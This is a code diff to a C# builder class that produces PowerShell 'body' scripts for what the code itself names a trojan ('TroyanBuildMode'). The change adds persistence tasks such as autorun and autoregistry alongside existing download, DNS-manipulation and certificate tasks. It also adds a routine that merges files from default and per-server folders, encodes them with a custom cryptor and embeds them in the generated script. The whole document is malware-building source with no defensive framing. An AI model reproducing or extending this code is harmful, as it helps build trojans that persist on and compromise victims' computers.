@@ -10,8 +10,8 @@ public sealed class BodyBuilder : CustomBuilder
 
     protected override string OutputFile => Mode == TroyanBuildMode.Debug ? L.BodyPs1Debug : L.BodyPs1;
 
-    protected override string[] PriorityTasks => new[] { "startdownloads", "dnsman", "cert" };
-    protected override string[] UnpriorityTasks => new[] { "extraupdate" };
+    protected override string[] PriorityTasks => new[] { "autorun", "autoregistry", "autostuff", "startdownloads", "dnsman", "cert" };
+    protected override string[] UnpriorityTasks => new[] { "extraupdate", "autoupdate" };
     protected override string EntryPoint => "program";
 
     protected override void InternalBuild(string server)
@@ -65,10 +65,10 @@ public sealed class BodyBuilder : CustomBuilder
         $xfront_name = @(
         _FRONT_NAME
         )
-        $xembed = @(
+        $xembeddings = @(
         _EMBED_X
         )
-        $xembed_name = @(
+        $xembeddings_name = @(
         _EMBED_NAME
         )
 ";
@@ -77,12 +77,51 @@ public sealed class BodyBuilder : CustomBuilder
         template = template.Replace("_FRONT_X", frontData, StringComparison.InvariantCulture);
         template = template.Replace("_FRONT_NAME", frontName);
 
-        var (embedName, embedData) = ReadEmbeddings("embeddings");
+        var (embedName, embedData) = ReadXEmbeddingsMerged();
         template = template.Replace("_EMBED_X", embedData, StringComparison.InvariantCulture);
         template = template.Replace("_EMBED_NAME", embedName);
 
         var outputPath = Path.Combine(L.TroyanScriptDir, "consts_embeddings.ps1");
         File.WriteAllText(outputPath, template);
+    }
+
+    /// <summary><c>$xembeddings</c>: <see cref="ServerLayoutPaths.DefaultsEmbedDir"/> first, then per-server <c>embeddings</c>; duplicate names keep the first.</summary>
+    private (string fileNames, string encodedData) ReadXEmbeddingsMerged()
+    {
+        var roots = new[]
+        {
+            L.DefaultsEmbedDir,
+            Path.Combine(L.UserDataDir, "embeddings")
+        };
+        var resultNames = new List<string>();
+        var resultData = new List<string>();
+        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+        foreach (var srcFolder in roots)
+        {
+            if (string.IsNullOrWhiteSpace(srcFolder) || !Directory.Exists(srcFolder))
+                continue;
+            foreach (var file in Directory.GetFiles(srcFolder))
+            {
+                try
+                {
+                    var fileName = Path.GetFileName(file);
+                    if (!seen.Add(fileName))
+                        continue;
+                    var fileContent = File.ReadAllBytes(file);
+                    var encodedContent = CustomCryptor.EncodeBytes(fileContent);
+                    resultNames.Add(fileName);
+                    resultData.Add(encodedContent);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error processing embedding file '{file}': {ex.Message}");
+                }
+            }
+        }
+
+        if (resultData.Count == 0)
+            return ("", "");
+        return (ConvertArrayToQuotedString(resultNames), ConvertArrayToQuotedString(resultData));
     }
 
     private (string fileNames, string encodedData) ReadEmbeddings(string name)
